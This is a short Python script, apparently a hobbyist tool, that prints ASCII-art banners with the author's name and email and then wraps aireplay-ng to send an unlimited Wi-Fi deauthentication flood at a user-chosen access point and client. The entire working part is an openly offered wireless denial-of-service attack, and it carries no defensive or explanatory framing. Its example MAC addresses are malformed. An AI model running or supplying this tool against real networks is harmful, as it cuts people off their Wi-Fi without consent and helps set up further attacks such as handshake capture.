import subprocess

print(r""" 
  _      _     _ _ _ _      _      _     _    _         ____       _________
 \ \    / /   |  _ _ _|    |  \   | |   | |  / /       /    \     |___   ___|
  \ \  / /    | |_ _ _     | |\\  | |   | | / /       /  /\  \        | |
   \ \/ /     |  _ _ _|    | | \\ | |   | |/_/\      |  /__\  |       | |
    \  /      | |_ _ _     | |  \\| |   | |  \ \     | |    | |       | |
     \/       |_ _ _ _|    |_|   \ _|   |_|   \_\    |_|    |_|       |_|

DINDI VENKAT SAI SAGAR... ... ...
""")

print('\n')
print("THANKS FOR USING MY TOOL :)")
print('\n')
print("YOU CAN REACH OUT TO ME BY :) ")
print('\n')
print("""
    _____
    | S |
    | A |
   _| G |_
   \  A  /
    \ R /
     \ /
      v
""")
print("venkatsaisagar.github@gmail.com")
print('\n')

if __name__=="__main__":
	a=input("please specify wifi bssid number,example: [00:11:22:33:44:55:66]")
	b=input("please specify clients bssid number,example:[77:88:99:aa:bb]")
	c=input("please specify the your interface name,example: ['wlan0mon']")
	subprocess.run(["aireplay-ng","--deauth","0","-a",a,"-c",b,c])
